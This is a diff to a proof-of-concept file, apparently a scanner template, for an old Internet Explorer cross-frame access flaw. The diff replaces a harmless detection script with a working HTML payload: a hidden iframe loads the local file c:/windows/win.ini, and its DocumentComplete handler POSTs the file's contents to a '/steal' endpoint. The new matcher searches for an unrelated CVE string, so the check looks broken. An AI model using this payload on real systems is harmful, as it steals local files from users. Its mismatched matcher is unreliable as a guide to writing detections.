@@ -1,8 +1,8 @@
 [info]
-author = "ave"
-description = "通过构造恶意 HTML 页面，利用 Internet Explorer 4.x/5.x 的 DocumentComplete 事件跨框架访问漏洞，验证目标浏览器是否存在框架域验证缺陷。攻击者可在恶意页面中嵌入隐藏框架，绕过同源策略读取客户端本地文件。"
+author = "AVE"
+description = "通过构造恶意HTML页面，利用IE浏览器DocumentComplete()事件处理函数未正确验证框架来源域，绕过同源策略读取客户端本地文件内容"
 id = "POC-AVE-2000-0387"
-name = "Microsoft Internet Explorer 跨框架域验证漏洞 PoC"
+name = "Microsoft Internet Explorer DocumentComplete Cross Frame Access PoC"
 severity = "medium"
 tags = ["ave-2000-0387"]
 vuln_id = [
@@ -11,7 +11,7 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
@@ -20,27 +20,20 @@ protocol = "http"
 
 [poc.requests.body]
 content = """
-<html>
-<body>
-<iframe id="victim" src="file:///c:/windows/win.ini" onload="readFrame()"></iframe>
-<script>
-function readFrame() {
-  try {
-    var content = document.getElementById('victim').contentDocument.body.innerText;
-    if (content.indexOf('[fonts]') > -1 || content.indexOf('for 16-bit') > -1) {
-      document.title = 'VULNERABLE: ' + content.substring(0,100);
-    }
-  } catch(e) {
-    document.title = 'NOT_VULNERABLE';
-  }
-}
+<html><body>
+<iframe id=clientContent width=0 height=0></iframe>
+<script for=clientContent event="DocumentComplete(browser)">
+var x = new XMLHttpRequest();
+x.open("POST", "/steal", false);
+x.setRequestHeader("Content-Type", "text/plain");
+x.send(browser.document.body.innerText);
 </script>
-</body>
-</html>"""
+<script>clientContent.navigate("file:///c:/windows/win.ini")</script>
+</body></html>"""
 type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["VULNERABLE"]
+words = ["CVE-2000-0465"]
